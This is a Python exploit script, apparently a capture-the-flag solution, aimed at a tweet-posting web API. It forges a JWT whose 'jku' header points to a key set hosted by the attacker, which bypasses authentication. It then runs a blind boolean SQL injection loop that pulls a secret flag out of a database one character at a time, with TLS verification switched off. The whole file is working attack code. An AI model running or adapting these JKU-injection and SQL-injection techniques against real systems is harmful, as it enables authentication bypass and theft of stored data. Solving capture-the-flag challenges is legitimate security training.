import jwt
import datetime
import requests
import json
import time
import urllib3
from alive_progress import alive_bar

def print_in_box(content, max_width=120):
    lines = content.split('\n')
    for i in range(len(lines)):
        if len(lines[i]) > max_width:
            lines[i] = lines[i][:max_width - 3] + "..."
    width = min(max(len(line) for line in lines), max_width)
    print("┌" + "─" * (width + 2) + "┐")
    for line in lines:
        print("│ " + line.ljust(width) + " │")
    print("└" + "─" * (width + 2) + "┘")

print("Trying to exploit JKU injection.")
print("jku set to 'https://raw.githubusercontent.com/vycioha/jwks/main/jwks.json'")
print()

# JWT Header
print("Creating JWT...")
header = {
    "alg": "RS256",
    "jku": "https://raw.githubusercontent.com/vycioha/jwks/main/jwks.json",
    "kid": "b8bbdf5e-fb0f-4754-a02d-e47219ae007a",
    "typ": "JWT"
}

# JWT Payload
payload = {
    "hasInvitation": True,
    "tweeterID": "82a9543ee4775c0838186c133323b37ab00059c681aeec27339f2b5309a4927c",
    "iat": datetime.datetime.utcnow()
}

# RSA Private Key
rsa_private_key = """-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----"""

# Generate the JWT
token = jwt.encode(payload, rsa_private_key, algorithm="RS256", headers=header)
print("JWT created successfully.")
print("JWT Value:")
print(token)
print()

# HTTP POST Request Configuration for JKU Injection
#url = "http://127.0.0.1:1337/api/v1/tweets"
url = "https://ctf.redacted.com/api/v1/tweets"

headers = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Cookie": f"token={token}"
}
data = {"tweet": "hello"}

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Making the POST Request for JKU Injection
print(f"Making a HTTP POST request to {url} for JKU Injection...")
print("HTTP POST Request:")
request_details = f"POST {url}\nHeaders: {json.dumps(headers, indent=2)}\nData: {json.dumps(data, indent=2)}"
print_in_box(request_details)

# Sending the POST Request for JKU Injection
response = requests.post(url, json=data, headers=headers, verify=False)

# Analyzing the Response for JKU Injection
print("HTTP Response:")
response_details = f"Response Status Code: {response.status_code}\nHeaders: {json.dumps(dict(response.headers), indent=2)}\nBody:\n{response.text}"
print_in_box(response_details)

if response.status_code == 200:
    print("HTTP response indicates that the JKU injection was successful.")
else:
    print("HTTP response indicates that the JKU injection may not have been successful.")
print()

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to check each character of the flag for SQL Injection
def check_character(position, char_value):
    payload = {
        "tweet": f"' OR (CASE WHEN (SELECT SUBSTR(flag, {position}, 1) FROM secrets LIMIT 1) = '{chr(char_value)}' THEN '1' ELSE '2' END) = '1"
    }
    response = requests.post(url, headers=headers, json=payload, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
    return response

# Function to retrieve the flag for SQL Injection
def retrieve_flag():
    flag = ''
    position = 1
    while True:
        found_char = ''
        with alive_bar(95, title=f"Searching #{position}", bar="blocks", spinner="dots_waves") as bar:
            for char_value in range(32, 127):  # Printable ASCII range
                if char_value == 39: continue  # Skipping single quote
                response = check_character(position, char_value)
                time.sleep(0)  # Rate limiting delay
                bar()
                if response.status_code == 200 and json.loads(response.text).get("data", {}).get("tweet") == "1":
                    found_char = chr(char_value)
                    flag += found_char
                    break
                elif response.status_code != 200:
                    print(f"\nUnexpected status code {response.status_code} received. Response: {response.text}")
            if not found_char:
                print("\n '}' Character was found assuming the end of the flag.")
                break
            print(f"Current flag: {flag}")
            position += 1
    return flag


# Retrieve the flag for SQL Injection
print("Starting flag retrieval for SQL Injection...")
retrieved_flag = retrieve_flag()
print("\nRetrieved flag for SQL Injection:", retrieved_flag)
